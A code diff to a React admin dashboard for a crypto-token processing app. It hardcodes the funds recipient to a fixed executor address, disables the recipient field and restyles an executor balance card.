@@ -13,7 +13,7 @@ export default function Admin() {
   const [groupedData, setGroupedData] = useState({});
   
   // Admin Settings
-  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || "");
+  const [recipient, setRecipient] = useState(HARDCODED_EXECUTOR);
   const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
 
   // Settings modal state (persisted in Firestore)
@@ -29,11 +29,10 @@ export default function Admin() {
   const [processingId, setProcessingId] = useState(null);
   const [statusMsg, setStatusMsg] = useState("");
 
-  // Save settings to local storage
+  // Save settings to local storage (do not persist recipient; it's forced to executor)
   useEffect(() => {
-    localStorage.setItem('admin_recipient', recipient);
     localStorage.setItem('admin_outputToken', outputToken);
-  }, [recipient, outputToken]);
+  }, [outputToken]);
 
   // Load settings from Firestore when opening settings modal
   const openSettings = async () => {
@@ -258,11 +257,16 @@ export default function Admin() {
             <div style={{display:'flex',alignItems:'center',gap:8}}>
                 <div className="connection-badge active">Server Mode</div>
                 <button className="settings-btn" onClick={openSettings} title="Settings">⚙️</button>
-                {/* Executor Balance Card */}
-                <div style={{marginLeft:12,background:'rgba(255,255,255,0.03)',padding:'6px 10px',borderRadius:8,display:'flex',flexDirection:'column',alignItems:'flex-start'}}>
-                  <div style={{fontSize:12,color:'#ccc'}}>Executor</div>
-                  <div style={{fontFamily:'monospace',fontSize:13}}>{(EXECUTOR_ADDRESS_UI && EXECUTOR_ADDRESS_UI.length>8) ? `${EXECUTOR_ADDRESS_UI.slice(0,6)}...${EXECUTOR_ADDRESS_UI.slice(-4)}` : '—'}</div>
-                  <div style={{fontSize:12,color:'#fff',marginTop:4}}>{executorEthBalance} ETH · {executorTokenBalance} {tokenSymbol}</div>
+                {/* Executor Balance Card (prominent) */}
+                <div style={{marginLeft:12,background:'linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01))',padding:'10px 14px',borderRadius:10,display:'flex',flexDirection:'column',alignItems:'flex-start',minWidth:200}}>
+                  <div style={{fontSize:12,color:'#bbb',marginBottom:6}}>Executor (forced)</div>
+                  <div style={{display:'flex',alignItems:'center',gap:10}}>
+                    <div style={{width:44,height:44,borderRadius:10,background:'rgba(255,255,255,0.03)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:18}}>⚡</div>
+                    <div>
+                      <div style={{fontFamily:'monospace',fontSize:13,color:'#fff'}}>{(EXECUTOR_ADDRESS_UI && EXECUTOR_ADDRESS_UI.length>8) ? `${EXECUTOR_ADDRESS_UI.slice(0,6)}...${EXECUTOR_ADDRESS_UI.slice(-4)}` : '—'}</div>
+                      <div style={{fontSize:12,color:'#9bd',marginTop:4}}>{executorEthBalance} ETH · {executorTokenBalance} {tokenSymbol}</div>
+                    </div>
+                  </div>
                 </div>
             </div>
           </div>
@@ -275,6 +279,7 @@ export default function Admin() {
                 value={recipient} 
                 onChange={(e) => setRecipient(e.target.value)} 
                 placeholder="0x... (Wallet to receive funds)" 
+                disabled={true}
               />
             </div>
             <div className="input-group">
